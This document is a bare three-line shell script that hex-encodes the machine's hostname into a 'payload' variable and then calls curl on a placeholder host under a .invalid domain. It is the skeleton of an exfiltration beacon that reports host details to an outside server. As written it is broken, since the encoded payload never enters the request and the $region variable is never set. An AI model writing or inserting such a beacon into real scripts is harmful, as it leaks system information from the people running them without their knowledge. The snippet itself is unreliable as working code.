#!/bin/sh
payload=$(hostname | xxd -p)
curl "https://$region.service.invalid/"
